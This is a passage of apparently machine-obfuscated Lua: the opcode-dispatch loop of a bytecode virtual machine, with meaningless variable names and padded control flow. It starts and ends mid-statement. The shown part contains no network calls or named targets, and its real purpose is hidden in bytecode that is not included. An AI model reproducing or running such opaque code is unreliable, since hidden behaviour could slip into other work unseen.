f[e[a]][e[u]]=f[e[l]];end end else if 156>t then local _;for t=0,2 do if 1>t then _=e[a]f[_]=f[_]()n=n+1;e=d[n];else if-1<t then for _=41,72 do if 2~=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;if not f[e[a]]then n=n+1;else n=e[u];end;break;end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end else if(e[a]<f[e[l]])then n=n+1;else n=e[u];end;end end else if 162<t then if t<=163 then if f[e[a]]then n=n+1;else n=e[u];end;else if t==164 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]]+f[e[l]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];else local e=e[a];do return h(f,e,s)end;end end else if t<=160 then local n=e[a]local a,e=b(f[n]())s=e+n-1 local e=0;for n=n,s do e=e+1;f[n]=a[e];end;else if 157~=t then for n=19,54 do if t~=161 then for e=e[a],e[u]do f[e]=nil;end;break;end;f[e[a]]=e[u]-f[e[l]];break;end;else for e=e[a],e[u]do f[e]=nil;end;end end end end else if 150<=t then if t>151 then if t>152 then if 151<t then repeat if t~=153 then local t;for _=0,4 do if 2<=_ then if 3<=_ then if 0<=_ then repeat if _<4 then t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];break;end;f[e[a]][e[u]]=f[e[l]];until true;else t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];end else f[e[a]]=f[e[u]]+f[e[l]];n=n+1;e=d[n];end else if 0~=_ then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end break;end;f[e[a]]=f[e[u]]+f[e[l]];until true;else f[e[a]]=f[e[u]]+f[e[l]];end else local _,t;f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]={};n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];_=e[u];t=f[_]for e=_+1,e[l]do t=t..f[e];end;f[e[a]]=t;n=n+1;e=d[n];f[e[a]][e[u]]=f[e[l]];end else if 151~=t then local t,_;for o=0,2 do if 0>=o then t=e[a]f[t](h(f,t+1,e[u]))n=n+1;e=d[n];else if o==1 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else t=e[a];_=f[e[u]];f[t+1]=_;f[t]=_[e[l]];end end end else local a=e[a];local l=e[l];local d=a+2 local a={f[a](f[a+1],f[d])};for e=1,l do f[d+e]=a[e];end;local a=a[1]if a then f[d]=a n=e[u];else n=n+1;end;end end else if 146>=t then if 143~=t then for h=40,69 do if t<146 then local t,h;f[e[a]]=o[e[u]];n=n+1;e=d[n];t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=_[e[u]];break;end;o[e[u]]=f[e[a]];break;end;else o[e[u]]=f[e[a]];end else if t>=148 then if 147~=t then repeat if t~=149 then local d=e[a];local u={};for e=1,#c do local e=c[e];for n=0,#e do local n=e[n];local a=n[1];local e=n[2];if a==f and e>=d then u[e]=a[e];n[1]=u;end;end;end;break;end;local n=e[a]local u={f[n](h(f,n+1,e[u]))};local a=0;for e=n,e[l]do a=a+1;f[e]=u[a];end until true;else local d=e[a];local a={};for e=1,#c do local e=c[e];for n=0,#e do local n=e[n];local u=n[1];local e=n[2];if u==f and e>=d then a[e]=u[e];n[1]=a;end;end;end;end else if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;end end end end else if t<134 then if t>=129 then if 130>=t then if 126<t then for _=37,59 do if 130>t then local o,s,c,h,r,t,_;for t=0,6 do if t<3 then if 1<=t then if t==1 then t=0;while t>-1 do if t>=3 then if t>4 then if t>=3 then repeat if 6~=t then f(r,h);break;end;t=-2;until true;else f(r,h);end else if 1~=t then for e=40,84 do if t~=3 then r=o[s];break;end;h=o[c];break;end;else h=o[c];end end else if 0<t then if t>-3 then for e=12,53 do if 1~=t then c=u;break;end;s=a;break;end;else s=a;end else o=e;end end t=t+1 end n=n+1;e=d[n];else _=e[a]f[_]=f[_](f[_+1])n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if 4<t then if t>=3 then for h=17,90 do if 6~=t then _=e[a]f[_]=f[_](f[_+1])n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];break;end;else _=e[a]f[_]=f[_](f[_+1])n=n+1;e=d[n];end else if 2<t then for _=13,92 do if t>3 then t=0;while t>-1 do if t>2 then if t<=4 then if t>3 then r=o[s];else h=o[c];end else if t~=2 then repeat if 5<t then t=-2;break;end;f(r,h);until true;else f(r,h);end end else if t>=1 then if t~=-3 then repeat if t~=1 then c=u;break;end;s=a;until true;else s=a;end else o=e;end end t=t+1 end n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else t=0;while t>-1 do if t>2 then if t<=4 then if t>3 then r=o[s];else h=o[c];end else if t~=2 then repeat if 5<t then t=-2;break;end;f(r,h);until true;else f(r,h);end end else if t>=1 then if t~=-3 then repeat if t~=1 then c=u;break;end;s=a;until true;else s=a;end else o=e;end end t=t+1 end n=n+1;e=d[n];end end end end break;end;local n=e[a];do return f[n](h(f,n+1,e[u]))end;break;end;else local o,r,c,h,s,t,_;for t=0,6 do if t<3 then if 1<=t then if t==1 then t=0;while t>-1 do if t>=3 then if t>4 then if t>=3 then repeat if 6~=t then f(s,h);break;end;t=-2;until true;else f(s,h);end else if 1~=t then for e=40,84 do if t~=3 then s=o[r];break;end;h=o[c];break;end;else h=o[c];end end else if 0<t then if t>-3 then for e=12,53 do if 1~=t then c=u;break;end;r=a;break;end;else r=a;end else o=e;end end t=t+1 end n=n+1;e=d[n];else _=e[a]f[_]=f[_](f[_+1])n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if 4<t then if t>=3 then for h=17,90 do if 6~=t then _=e[a]f[_]=f[_](f[_+1])n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];break;end;else _=e[a]f[_]=f[_](f[_+1])n=n+1;e=d[n];end else if 2<t then for _=13,92 do if t>3 then t=0;while t>-1 do if t>2 then if t<=4 then if t>3 then s=o[r];else h=o[c];end else if t~=2 then repeat if 5<t then t=-2;break;end;f(s,h);until true;else f(s,h);end end else if t>=1 then if t~=-3 then repeat if t~=1 then c=u;break;end;r=a;until true;else r=a;end else o=e;end end t=t+1 end n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else t=0;while t>-1 do if t>2 then if t<=4 then if t>3 then s=o[r];else h=o[c];end else if t~=2 then repeat if 5<t then t=-2;break;end;f(s,h);until true;else f(s,h);end end else if t>=1 then if t~=-3 then repeat if t~=1 then c=u;break;end;r=a;until true;else r=a;end else o=e;end end t=t+1 end n=n+1;e=d[n];end end end end end else if 132<=t then if 132~=t then local t;for _=0,3 do if 2<=_ then if _~=0 then for t=43,87 do if _<3 then f[e[a]]=#f[e[u]];n=n+1;e=d[n];break;end;if(e[a]<f[e[l]])then n=n+1;else n=e[u];end;break;end;else if(e[a]<f[e[l]])then n=n+1;else n=e[u];end;end else if _>-1 then for o=28,78 do if _~=0 then t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];end end end else do return end;end else local t;t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];end end else if 126>t then if t>121 then for o=47,68 do if 124~=t then for t=0,4 do if t<=1 then if-4<=t then repeat if 1~=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];until true;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end else if 3<=t then if 3<t then if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end break;end;local t,r;for o=0,4 do if o<=1 then if 1>o then t=e[a];r=f[e[u]];f[t+1]=r;f[t]=r[e[l]];n=n+1;e=d[n];else f(e[a],e[u]);n=n+1;e=d[n];end else if 2>=o then t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];else if 0~=o then for l=42,86 do if o<4 then f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;if f[e[a]]then n=n+1;else n=e[u];end;break;end;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end end end break;end;else local t,r;for o=0,4 do if o<=1 then if 1>o then t=e[a];r=f[e[u]];f[t+1]=r;f[t]=r[e[l]];n=n+1;e=d[n];else f(e[a],e[u]);n=n+1;e=d[n];end else if 2>=o then t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];else if 0~=o then for l=42,86 do if o<4 then f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;if f[e[a]]then n=n+1;else n=e[u];end;break;end;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end end end end else if t>=127 then if t~=125 then for o=43,60 do if t<128 then local t,o;f[e[a]]=_[e[u]];n=n+1;e=d[n];t=e[a];o=f[e[u]];f[t+1]=o;f[t]=o[e[l]];n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];t=e[a];o=f[e[u]];f[t+1]=o;f[t]=o[e[l]];n=n+1;e=d[n];f(e[a],e[u]);break;end;n=e[u];break;end;else n=e[u];end else f[e[a]]=_[e[u]];end end end else if 139<=t then if 142>t then if t<=139 then f[e[a]]=(e[u]~=0);else if t~=137 then repeat if 141~=t then for t=0,4 do if 2>t then if-1<=t then repeat if t<1 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];until true;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end else if 3<=t then if t>=-1 then repeat if 3~=t then if(f[e[a]]~=f[e[l]])then n=n+1;else n=e[u];end;break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];until true;else if(f[e[a]]~=f[e[l]])then n=n+1;else n=e[u];end;end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end break;end;f[e[a]][e[u]]=e[l];until true;else f[e[a]][e[u]]=e[l];end end else if t>=143 then if 143==t then local t;for _=0,4 do if _>=2 then if _>2 then if 3~=_ then if not f[e[a]]then n=n+1;else n=e[u];end;else f[e[a]]=o[e[u]];n=n+1;e=d[n];end else o[e[u]]=f[e[a]];n=n+1;e=d[n];end else if _>-2 then for h=46,77 do if 0~=_ then t=e[a]f[t]=f[t]()n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else t=e[a]f[t]=f[t]()n=n+1;e=d[n];end end end else local a=e[a];local l=f[a+2];local d=f[a]+l;f[a]=d;if(l>0)then if(d<=f[a+1])then n=e[u];f[a+3]=d;end elseif(d>=f[a+1])then n=e[u];f[a+3]=d;end end else local t;f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];t=e[a]f[t](h(f,t+1,e[u]))n=n+1;e=d[n];do return end;end end else if t>135 then if t<137 then local d=e[a];local a={};for e=1,#c do local e=c[e];for n=0,#e do local n=e[n];local u=n[1];local e=n[2];if u==f and e>=d then a[e]=u[e];n[1]=a;end;end;end;else if 134<=t then repeat if t>137 then for t=0,6 do if t>=3 then if 4>=t then if t~=1 then for _=26,95 do if 3<t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if 3<t then for _=14,81 do if 6>t then f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];break;end;f[e[a]][e[u]]=e[l];break;end;else f[e[a]][e[u]]=e[l];end end else if t>0 then if t>-2 then repeat if 2~=t then f[e[a]][e[u]]=e[l];n=n+1;e=d[n];break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];until true;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end else f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];end end end break;end;local n=e[a]f[n](h(f,n+1,e[u]))until true;else local n=e[a]f[n](h(f,n+1,e[u]))end end else if t>=133 then repeat if t>134 then if(f[e[a]]==f[e[l]])then n=n+1;else n=e[u];end;break;end;do return f[e[a]]end until true;else do return f[e[a]]end end end end end end end else if 41<=t then if 61<t then if t<=71 then if t<=66 then if 64>t then if 60<=t then repeat if 62<t then local t,h;f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]];n=n+1;e=d[n];t=e[a]f[t](f[t+1])n=n+1;e=d[n];f[e[a]]=(e[u]~=0);n=n+1;e=d[n];for e=e[a],e[u]do f[e]=nil;end;n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];break;end;f[e[a]]={};until true;else f[e[a]]={};end else if t>=65 then if t>62 then for _=28,55 do if t<66 then f[e[a]]=#f[e[u]];break;end;local t;for _=0,6 do if 3<=_ then if _>=5 then if 5~=_ then f(e[a],e[u]);else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else if 2<_ then for l=47,93 do if _~=3 then t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];break;end;f(e[a],e[u]);n=n+1;e=d[n];break;end;else t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];end end else if _>=1 then if 0~=_ then for h=42,72 do if 1<_ then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];break;end;else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end else f(e[a],e[u]);n=n+1;e=d[n];end end end break;end;else f[e[a]]=#f[e[u]];end else if(f[e[a]]~=f[e[l]])then n=n+1;else n=e[u];end;end end else if 68<t then if t<=69 then local n=e[a];do return f[n](h(f,n+1,e[u]))end;else if t>67 then for _=18,70 do if t<71 then local t,r,_,k,c,o;t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];r=e[u];_=f[r]for e=r+1,e[l]do _=_..f[e];end;f[e[a]]=_;n=n+1;e=d[n];t=e[a]k,c=b(f[t](h(f,t+1,e[u])))s=c+t-1 o=0;for e=t,s do o=o+1;f[e]=k[o];end;n=n+1;e=d[n];t=e[a]f[t]=f[t](h(f,t+1,s))n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];do return f[e[a]]end break;end;local k,t,c,b,s,h,o,r,_;local d=0;while d>-1 do if d>=3 then if d>=5 then if 1<=d then for e=19,66 do if 6>d then n=_;break;end;d=-2;break;end;else n=_;end else if-1~=d then for e=18,62 do if d~=3 then _=o==r and t[h]or 1+c;break;end;o=k[b];r=k[s];break;end;else _=o==r and t[h]or 1+c;end end else if 0<d then if-3<=d then repeat if d~=2 then t=e;c=n;break;end;b=t[a];s=t[l];h=u;until true;else b=t[a];s=t[l];h=u;end else k=f;end end d=d+1 end break;end;else local o,t,c,r,k,_,b,s,h;local d=0;while d>-1 do if d>=3 then if d>=5 then if 1<=d then for e=19,66 do if 6>d then n=h;break;end;d=-2;break;end;else n=h;end else if-1~=d then for e=18,62 do if d~=3 then h=b==s and t[_]or 1+c;break;end;b=o[r];s=o[k];break;end;else h=b==s and t[_]or 1+c;end end else if 0<d then if-3<=d then repeat if d~=2 then t=e;c=n;break;end;r=t[a];k=t[l];_=u;until true;else r=t[a];k=t[l];_=u;end else o=f;end end d=d+1 end end end else if t>=65 then repeat if 67~=t then f(e[a],e[u]);break;end;local t,r;for s=0,6 do if 3>s then if 1<=s then if s>-1 then repeat if 1<s then f(e[a],e[u]);n=n+1;e=d[n];break;end;t=e[a];r=f[e[u]];f[t+1]=r;f[t]=r[e[l]];n=n+1;e=d[n];until true;else t=e[a];r=f[e[u]];f[t+1]=r;f[t]=r[e[l]];n=n+1;e=d[n];end else f[e[a]]=_[e[u]];n=n+1;e=d[n];end else if 5<=s then if 4<=s then repeat if s>5 then f[e[a]]=o[e[u]];break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];until true;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end else if s>0 then repeat if 4~=s then t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];break;end;t=e[a];r=f[e[u]];f[t+1]=r;f[t]=r[e[l]];n=n+1;e=d[n];until true;else t=e[a]f[t]=f[t](h(f,t+1,e[u]))n=n+1;e=d[n];end end end end until true;else f(e[a],e[u]);end end end else if t<=76 then if 73>=t then if t~=68 then for o=43,57 do if t~=73 then local e=e[a];do return h(f,e,s)end;break;end;local o,r,t;f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]];n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];o=e[a]r={f[o](h(f,o+1,e[u]))};t=0;for e=o,e[l]do t=t+1;f[e]=r[t];end n=n+1;e=d[n];if f[e[a]]then n=n+1;else n=e[u];end;break;end;else local t,r,o;f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]];n=n+1;e=d[n];f(e[a],e[u]);n=n+1;e=d[n];t=e[a]r={f[t](h(f,t+1,e[u]))};o=0;for e=t,e[l]do o=o+1;f[e]=r[o];end n=n+1;e=d[n];if f[e[a]]then n=n+1;else n=e[u];end;end else if t>74 then if 75==t then local h;for t=0,6 do if 2>=t then if t<=0 then f(e[a],e[u]);n=n+1;e=d[n];else if-2<=t then for l=23,68 do if 1~=t then f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;h=e[a]f[h]=f[h](f[h+1])n=n+1;e=d[n];break;end;else h=e[a]f[h]=f[h](f[h+1])n=n+1;e=d[n];end end else if t<=4 then if 0<=t then for _=33,96 do if t~=4 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];break;end;f(e[a],e[u]);n=n+1;e=d[n];break;end;else f(e[a],e[u]);n=n+1;e=d[n];end else if 4<t then for l=33,98 do if t~=5 then f(e[a],e[u]);break;end;f(e[a],e[u]);n=n+1;e=d[n];break;end;else f(e[a],e[u]);end end end end else local n=e[a];local a=f[e[u]];f[n+1]=a;f[n]=a[e[l]];end else local t,o;t=e[a];o=f[e[u]];f[t+1]=o;f[t]=o[e[l]];n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];t=e[a]f[t](h(f,t+1,e[u]))n=n+1;e=d[n];f[e[a]]=(e[u]~=0);n=n+1;e=d[n];do return f[e[a]]end end end else if 80>t then if t<=77 then local _,r;for t=0,6 do if t>=3 then if t<=4 then if 4>t then _=e[a]f[_]=f[_](h(f,_+1,e[u]))n=n+1;e=d[n];else f[e[a]]=f[e[u]][f[e[l]]];n=n+1;e=d[n];end else if 1<=t then repeat if t~=6 then f[e[a]]=o[e[u]];n=n+1;e=d[n];break;end;_=e[a];r=f[e[u]];f[_+1]=r;f[_]=r[e[l]];until true;else f[e[a]]=o[e[u]];n=n+1;e=d[n];end end else if 1<=t then if t~=-1 then for l=24,55 do if 2>t then f(e[a],e[u]);n=n+1;e=d[n];break;end;f[e[a]]=#f[e[u]];n=n+1;e=d[n];break;end;else f(e[a],e[u]);n=n+1;e=d[n];end else f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];end end end else if 78==t then local t,h;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]();n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];n=n+1;e=d[n];t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];if f[e[a]]then n=n+1;else n=e[u];end;else local o;for t=0,6 do if 2>=t then if t>=1 then if t>=-2 then for h=37,84 do if t~=2 then f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];break;end;f[e[a]]=_[e[u]];n=n+1;e=d[n];break;end;else f[e[a]]=_[e[u]];n=n+1;e=d[n];end else o=e[a]f[o]=f[o](h(f,o+1,e[u]))n=n+1;e=d[n];end else if 4<t then if 1~=t then repeat if t~=5 then f(e[a],e[u]);break;end;f(e[a],e[u]);n=n+1;e=d[n];until true;else f(e[a],e[u]);end else if t<4 then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else f(e[a],e[u]);n=n+1;e=d[n];end end end end end end else if 80>=t then local a=e[a]local u={f[a](f[a+1])};local n=0;for e=a,e[l]do n=n+1;f[e]=u[n];end else if t>=77 then repeat if 81<t then local a=e[a];local d=f[a]local l=f[a+2];if(l>0)then if(d>f[a+1])then n=e[u];else f[a+3]=d;end elseif(d<f[a+1])then n=e[u];else f[a+3]=d;end break;end;local a=e[a];local d=f[a]local l=f[a+2];if(l>0)then if(d>f[a+1])then n=e[u];else f[a+3]=d;end elseif(d<f[a+1])then n=e[u];else f[a+3]=d;end until true;else local a=e[a];local d=f[a]local l=f[a+2];if(l>0)then if(d>f[a+1])then n=e[u];else f[a+3]=d;end elseif(d<f[a+1])then n=e[u];else f[a+3]=d;end end end end end end else if t<=50 then if t>=46 then if 47<t then if t>48 then if t>=48 then repeat if 49<t then local t,h;for r=0,6 do if r>2 then if 4>=r then if 3~=r then t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];n=n+1;e=d[n];else f[e[a]]=o[e[u]];n=n+1;e=d[n];end else if r~=5 then f[e[a]]=f[e[u]][e[l]];else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end else if 0>=r then f[e[a]]=o[e[u]];n=n+1;e=d[n];else if-2<r then repeat if r>1 then t=e[a]f[t](f[t+1])n=n+1;e=d[n];break;end;t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];n=n+1;e=d[n];until true;else t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];n=n+1;e=d[n];end end end end break;end;local d,l,_,h,o,t;local n=0;while n>-1 do if n>=4 then if n<6 then if 3<n then for e=37,82 do if 5~=n then o=h[d[_]];break;end;t=d[l];break;end;else t=d[l];end else if n>3 then for e=27,83 do if n~=6 then n=-2;break;end;f[t]=o;break;end;else n=-2;end end else if 2<=n then if 3~=n then _=u;else h=f;end else if n>=-3 then repeat if n~=0 then l=a;break;end;d=e;until true;else l=a;end end end n=n+1 end until true;else local t,h;for r=0,6 do if r>2 then if 4>=r then if 3~=r then t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];n=n+1;e=d[n];else f[e[a]]=o[e[u]];n=n+1;e=d[n];end else if r~=5 then f[e[a]]=f[e[u]][e[l]];else f[e[a]]=_[e[u]];n=n+1;e=d[n];end end else if 0>=r then f[e[a]]=o[e[u]];n=n+1;e=d[n];else if-2<r then repeat if r>1 then t=e[a]f[t](f[t+1])n=n+1;e=d[n];break;end;t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];n=n+1;e=d[n];until true;else t=e[a];h=f[e[u]];f[t+1]=h;f[t]=h[e[l]];n=n+1;e=d[n];end end end end end else local e=e[a]f[e](h(f,e+1,s))end else if t<47 then f[e[a]][e[u]]=e[l];else local n=e[a]local a,e=b(f[n](h(f,n+1,e[u])))s=e+n-1 local e=0;for n=n,s do e=e+1;f[n]=a[e];end;end end else if 43>t then if 38~=t then for d=16,87 do if 42~=t then _[e[u]]=f[e[a]];break;end;if(e[a]<f[e[l]])then n=n+1;else n=e[u];end;break;end;else if(e[a]<f[e[l]])then n=n+1;else n=e[u];end;end else if t>=44 then if t>=42 then for o=46,96 do if 45~=t then local o,r,c,p,s,k,b,t;for t=0,6 do if 3<=t then if t<=4 then if 4==t then o=e[a]f[o]=f[o](h(f,o+1,e[u]))n=n+1;e=d[n];else t=0;while t>-1 do if t>2 then if 5>t then if t>3 then b=c[p];else k=c[s];end else if t>5 then t=-2;else f(b,k);end end else if 0>=t then c=e;else if 0<t then repeat if t>1 then s=u;break;end;p=a;until true;else s=u;end end end t=t+1 end n=n+1;e=d[n];end else if t~=3 then repeat if 5<t then f[e[a]]=_[e[u]];break;end;f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];until true;else f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];end end else if 0>=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else if t>-2 then repeat if t~=1 then o=e[a];r=f[e[u]];f[o+1]=r;f[o]=r[e[l]];n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];until true;else o=e[a];r=f[e[u]];f[o+1]=r;f[o]=r[e[l]];n=n+1;e=d[n];end end end end break;end;local l;for t=0,2 do if t<=0 then l=e[a]f[l](h(f,l+1,e[u]))n=n+1;e=d[n];else if t<2 then f[e[a]]=_[e[u]];n=n+1;e=d[n];else if f[e[a]]then n=n+1;else n=e[u];end;end end end break;end;else local o,r,c,b,s,k,p,t;for t=0,6 do if 3<=t then if t<=4 then if 4==t then o=e[a]f[o]=f[o](h(f,o+1,e[u]))n=n+1;e=d[n];else t=0;while t>-1 do if t>2 then if 5>t then if t>3 then p=c[b];else k=c[s];end else if t>5 then t=-2;else f(p,k);end end else if 0>=t then c=e;else if 0<t then repeat if t>1 then s=u;break;end;b=a;until true;else s=u;end end end t=t+1 end n=n+1;e=d[n];end else if t~=3 then repeat if 5<t then f[e[a]]=_[e[u]];break;end;f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];until true;else f[e[a]][e[u]]=f[e[l]];n=n+1;e=d[n];end end else if 0>=t then f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];else if t>-2 then repeat if t~=1 then o=e[a];r=f[e[u]];f[o+1]=r;f[o]=r[e[l]];n=n+1;e=d[n];break;end;f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];until true;else o=e[a];r=f[e[u]];f[o+1]=r;f[o]=r[e[l]];n=n+1;e=d[n];end end end end end else local l;f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];f[e[a]]=o[e[u]];n=n+1;e=d[n];l=e[a]f[l](h(f,l+1,e[u]))n=n+1;e=d[n];do return end;end end end else if t>55 then if t>58 then if 59<t then if t>58 then repeat if 61~=t then if(f[e[a]]<=f[e[l]])then n=n+1;else n=e[u];end;break;end;local e=e[a]f[e]=f[e](f[e+1])until true;else local e=e[a]f[e]=f[e](f[e+1])end else for l=0,2 do if 1<=l then if 1<l then f(e[a],e[u]);else f(e[a],e[u]);n=n+1;e=d[n];end else f[e[a]]=(e[u]~=0);n=n+1;e=d[n];end end end else if t>56 then if t>=56 then repeat if t>57 then local t;t=e[a]f[t](h(f,t+1,e[u]))n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=_[e[u]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];n=n+1;e=d[n];t=e[a]f[t]=f[t](f[t+1])n=n+1;e=d[n];f[e[a]]=f[e[u]][e[l]];break;end;f[e[a]]();until true;else f[e[a]]();end else local a=e[a];local l=e[l];local d=a+2 local a={f[a](f[a+1],f[d])};for e=1,l do f[d+e]=a[e];end;local a=a[1]if a then f[d]=a n=e[u];else n=n+1;end;end end else if 53>t then if 49~=t then repeat if t>51 then f[e[a]]=f[e[u]]-f[e[l]];break;end;local n=e[a]f[n]=f[n](h(f,n+1,e[u]))until true;else f[e[a]]=f[e[u]]-f[e[l]];end else if t<=53 then local s,b,k,c,r,t,o;for t=0,6 do if 2<t then if 4>=t then if 2<=t then for l=30,84 do if t~=3 then f(e[a],e[u]);n=n+1;e=d[n];break;end;f(e[a],e[u]);n=n+1;e=d[n];break;end;else f(e[a],e[u]);n=n+1;e=d[n];end else if t~=5 then o=e[a]f[o]=f[o](h(f,o+1,e[u]))else t=0;while t>-1 do if t<3 then if 1<=t then if t>=-2 then for e=31,79 do if 1<t then k=u;break;end;b=a;break;end;else b=a;end else s=e;end else if t<5 then if 3<t then r=s[b];else 